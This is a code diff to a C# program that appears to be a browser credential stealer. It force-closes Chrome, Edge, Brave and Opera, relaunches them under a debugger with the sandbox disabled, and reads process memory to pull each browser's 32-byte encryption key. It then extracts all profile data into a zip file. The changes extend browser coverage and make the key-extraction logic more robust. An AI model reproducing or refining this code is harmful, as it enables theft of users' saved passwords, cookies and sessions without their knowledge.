@@ -6,6 +6,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Linq;
 using System.Diagnostics;
+using System.Threading;
 
 namespace ConsoleApp1
 {
@@ -16,7 +17,7 @@ namespace ConsoleApp1
             public string Name { get; set; }
             public string ProcessName { get; set; }
             public string[] ExePaths { get; set; }
-            public string DllName { get; set; }
+            public string[] DllNames { get; set; }
             public string[] UserDataSubdir { get; set; }
             public string OutputDir { get; set; }
             public string TempPrefix { get; set; }
@@ -34,9 +35,10 @@ namespace ConsoleApp1
                 ExePaths = new[]
                 {
                     @"C:\Program Files\Google\Chrome\Application\chrome.exe",
-                    @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+                    @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\Application\chrome.exe")
                 },
-                DllName = "chrome.dll",
+                DllNames = new[] { "chrome.dll" },
                 UserDataSubdir = new[] { "Google", "Chrome", "User Data" },
                 OutputDir = "chrome",
                 TempPrefix = "chrome_tmp",
@@ -51,9 +53,10 @@ namespace ConsoleApp1
                 ExePaths = new[]
                 {
                     @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-                    @"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
+                    @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\Application\msedge.exe")
                 },
-                DllName = "msedge.dll",
+                DllNames = new[] { "msedge.dll" },
                 UserDataSubdir = new[] { "Microsoft", "Edge", "User Data" },
                 OutputDir = "edge",
                 TempPrefix = "edge_tmp",
@@ -68,9 +71,10 @@ namespace ConsoleApp1
                 ExePaths = new[]
                 {
                     @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
-                    @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
+                    @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\Application\brave.exe")
                 },
-                DllName = "chrome.dll",
+                DllNames = new[] { "brave.dll", "chrome.dll" },
                 UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" },
                 OutputDir = "brave",
                 TempPrefix = "brave_tmp",
@@ -88,7 +92,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\Opera\launcher.exe",
                     @"C:\Program Files (x86)\Opera\launcher.exe"
                 },
-                DllName = "launcher_lib.dll",
+                DllNames = new[] { "launcher_lib.dll" },
                 UserDataSubdir = new[] { "Opera Software", "Opera Stable" },
                 OutputDir = "opera",
                 TempPrefix = "opera_tmp",
@@ -106,7 +110,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\Opera GX\launcher.exe",
                     @"C:\Program Files (x86)\Opera GX\launcher.exe"
                 },
-                DllName = "launcher_lib.dll",
+                DllNames = new[] { "launcher_lib.dll" },
                 UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" },
                 OutputDir = "operagx",
                 TempPrefix = "operagx_tmp",
@@ -236,7 +240,7 @@ namespace ConsoleApp1
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern bool CreateProcess(
             string lpApplicationName,
-            string lpCommandLine,
+            StringBuilder lpCommandLine,
             IntPtr lpProcessAttributes,
             IntPtr lpThreadAttributes,
             bool bInheritHandles,
@@ -452,6 +456,7 @@ namespace ConsoleApp1
             KillProcessesByName("brave.exe");
             KillProcessesByName("opera.exe");
             KillProcessesByName("launcher.exe");
+            Thread.Sleep(500);
 
             foreach (var config in Configs)
             {
@@ -504,7 +509,7 @@ namespace ConsoleApp1
                 si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-                string cmdLine = $"\"{exePath}\" --no-first-run --no-default-browser-check";
+                StringBuilder cmdLine = new StringBuilder($"\"{exePath}\" --no-first-run --no-default-browser-check --no-sandbox --disable-gpu");
 
                 if (CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi))
                 {
@@ -515,7 +520,7 @@ namespace ConsoleApp1
                 }
                 else
                 {
-                    Console.WriteLine($"[!] {config.Name}: Failed to start process for debugging.");
+                    Console.WriteLine($"[!] {config.Name}: Failed to start process for debugging. Error: {Marshal.GetLastWin32Error()}");
                 }
             }
         }
@@ -536,9 +541,9 @@ namespace ConsoleApp1
                     if (GetFinalPathNameByHandle(loadDll.hFile, sb, (uint)sb.Capacity, 0) > 0)
                     {
                         string path = sb.ToString();
-                        if (path.IndexOf(config.DllName, StringComparison.OrdinalIgnoreCase) >= 0)
+                        if (config.DllNames.Any(d => path.IndexOf(d, StringComparison.OrdinalIgnoreCase) >= 0))
                         {
-                            Console.WriteLine($"[*] Debugger: Found {config.DllName} at {loadDll.lpBaseOfDll:X}");
+                            Console.WriteLine($"[*] Debugger: Found target DLL at {loadDll.lpBaseOfDll:X}");
                             targetAddress = FindTargetAddress(hProcess, loadDll.lpBaseOfDll);
                             if (targetAddress != IntPtr.Zero)
                             {
@@ -575,6 +580,10 @@ namespace ConsoleApp1
                             }
                         }
                         SetResumeFlag(debugEvent.dwThreadId);
+                    }
+                    else
+                    {
+                        continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                     }
                 }
                 else if (debugEvent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)
@@ -616,7 +625,7 @@ namespace ConsoleApp1
             for (int i = 0; i < numSections; i++)
             {
                 string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
-                if (name == ".rdata")
+                if (name.StartsWith(".rdata") || name.StartsWith(".data"))
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
@@ -637,8 +646,8 @@ namespace ConsoleApp1
 
             for (int i = 0; i < numSections; i++)
             {
-                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
-                if (name == ".text")
+                uint characteristics = BitConverter.ToUInt32(sectionHeaders, i * 40 + 36);
+                if ((characteristics & 0x20000020) != 0) // IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
@@ -740,7 +749,7 @@ namespace ConsoleApp1
             ctx.ContextFlags = CONTEXT_FULL;
             if (GetThreadContext(hThread, ref ctx))
             {
-                ulong[] ptrs = config.UseR14 ? new[] { ctx.R14, ctx.R15 } : new[] { ctx.R15, ctx.R14 };
+                ulong[] ptrs = new[] { ctx.R15, ctx.R14, ctx.R13, ctx.R12 };
                 foreach (ulong ptr in ptrs)
                 {
                     if (ptr == 0) continue;
@@ -749,17 +758,24 @@ namespace ConsoleApp1
                     {
                         ulong dataPtr = ptr;
                         ulong length = BitConverter.ToUInt64(buffer, 8);
-                        if (length == 32) dataPtr = BitConverter.ToUInt64(buffer, 0);
-
-                        byte[] key = new byte[32];
-                        if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, (uint)key.Length, out _))
+                        if (length == 32)
                         {
-                            if (key.Any(b => b != 0))
+                            dataPtr = BitConverter.ToUInt64(buffer, 0);
+                            if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, buffer, 32, out _))
                             {
-                                ExtractAllProfilesData(key, null, config, userDataDir, zipPath);
-                                success = true;
-                                break;
+                                if (buffer.Any(b => b != 0))
+                                {
+                                    ExtractAllProfilesData(buffer, null, config, userDataDir, zipPath);
+                                    success = true;
+                                    break;
+                                }
                             }
+                        }
+                        else if (buffer.Any(b => b != 0))
+                        {
+                            ExtractAllProfilesData(buffer, null, config, userDataDir, zipPath);
+                            success = true;
+                            break;
                         }
                     }
                 }
